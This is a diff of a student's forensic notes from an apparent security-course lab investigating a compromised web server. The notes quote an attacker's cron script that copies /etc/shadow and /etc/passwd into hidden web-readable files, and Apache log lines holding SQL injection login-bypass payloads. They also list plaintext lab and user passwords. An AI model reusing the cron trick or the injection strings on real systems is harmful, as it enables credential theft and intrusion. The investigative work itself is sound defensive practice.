@@ -1,4 +1,10 @@
 
+	ssh arnold@192.168.111.129
+	password: csc347GreatStuff!
+
+	/usr/lib/tripwire
+	/usr/share/doc/tripwire
+	/usr/share/doc/tripwire
 
 	logs:
 	https://superuser.com/questions/565927/differences-in-var-log-syslog-dmesg-messages-log-files
@@ -113,3 +119,80 @@ grep:
 
 bill's passwd:
 billGatesIsGreat
+
+
+find all files newer than mark.start and older than mark.end
+
+		touch /home/arnold/mark.start -d "2020-11-11 00:00"
+		touch /home/arnold/mark.end -d "2020-11-12 00:00"
+		sudo find / -newer /home/arnold/mark.start ! -newer /home/arnold/mark.end
+
+		or
+		touch /home/arnold/mark.start -d "2020-11-11 00:00"
+		touch /home/arnold/mark.end -d "2020-11-14 00:00"
+		sudo find / -newer /home/arnold/mark.start ! -newer /home/arnold/mark.end
+
+grep for when bill signed into fourFours:
+ 		grep "billGatesIsGreat%" /var/log/apache2/access.log
+
+
+one of the files made on nov 11:
+		sudo cat /var/spool/cron/atjobs/a00001019882c9
+
+		sudo stat /var/spool/cron/atjobs/a00001019882c9
+
+				File: `/var/spool/cron/atjobs/a00001019882c9'
+		Size: 2187            Blocks: 8          IO Block: 4096   regular file
+		Device: 801h/2049d      Inode: 173476      Links: 1
+		Access: (0700/-rwx------)  Uid: (    0/    root)   Gid: (    1/  daemon)
+		Access: 2020-11-19 00:33:17.000000000 -0500
+		Modify: 2020-11-11 13:49:54.000000000 -0500
+		Change: 2020-11-11 13:49:54.000000000 -0500
+
+		So was made by attacker
+
+another file attacker modified:
+	/etc/cron.hourly/backup
+	cat backup
+
+	#!/bin/bash
+	/bin/cat /etc/shadow | /usr/bin/tr '[A-Za-z:]' '[N-ZA-Mn-za-m.]' > /var/www/fourFours/.sh
+	/bin/cat /etc/passwd | /usr/bin/tr '[A-Za-z:]' '[N-ZA-Mn-za-m.]' > /var/www/fourFours/.pa
+
+questions:
+	how did attacker get charlie?
+
+
+broken fourFours accounts:
+		cat apache2/access.log | grep "lion%"
+		172.16.107.140 - - [11/Nov/2020:13:19:27 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27anne%25%27+and+passwd+like+%27lion%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65788 "-" "Python-urllib/3.8"
+
+		cat apache2/access.log | grep "fourfivesix%"
+		172.16.107.140 - - [11/Nov/2020:13:19:49 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27lindah20%25%27+and+passwd+like+%27fourfivesix%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65443 "-" "Python-urllib/3.8"
+
+		cat apache2/access.log | grep "password1%"
+		172.16.107.140 - - [11/Nov/2020:13:19:53 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27matchstick%25%27+and+passwd+like+%27password1%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65444 "-" "Python-urllib/3.8"
+
+		cat apache2/access.log | grep "passw0rd%"
+		172.16.107.140 - - [11/Nov/2020:13:20:01 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27ssll%25%27+and+passwd+like+%27passw0rd%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65443 "-" "Python-urllib/3.8"
+
+		cat apache2/access.log | grep "passwd+like+%27cliff%"
+		172.16.107.140 - - [11/Nov/2020:13:19:32 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27cliff%25%27+and+passwd+like+%27cliff%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65674 "-" "Python-urllib/3.8"
+
+		cat apache2/access.log | grep "passwd+like+%27perl%"
+		172.16.107.140 - - [11/Nov/2020:13:19:56 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27perl%25%27+and+passwd+like+%27perl%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65542 "-" "Python-urllib/3.8"
+
+		cat apache2/access.log | grep "jbh%"
+		172.16.107.140 - - [11/Nov/2020:13:19:41 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27hotel%25%27+and+passwd+like+%27jbh%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65542 "-" "Python-urllib/3.8"
+
+		cat apache2/access.log | grep "esrever%"
+		172.16.107.140 - - [11/Nov/2020:13:19:35 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27dk%25%27+and+passwd+like+%27esrever%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65544 "-" "Python-urllib/3.8"
+
+		cat apache2/access.log | grep "badPassword%"
+		172.16.107.140 - - [11/Nov/2020:13:19:38 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27eightball%25%27+and+passwd+like+%27badPassword%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65544 "-" "Python-urllib/3.8"
+
+		cat apache2/access.log | grep "grant%"
+		172.16.107.140 - - [11/Nov/2020:13:19:43 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27ivanna%25%27+and+passwd+like+%27grant%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65545 "-" "Python-urllib/3.8"
+
+		grep "billGatesIsGreat%" /var/log/apache2/access.log
+		172.16.107.140 - - [11/Nov/2020:13:19:31 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27bill%25%27+and+passwd+like+%27billGatesIsGreat%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65442 "-" "Python-urllib/3.8"
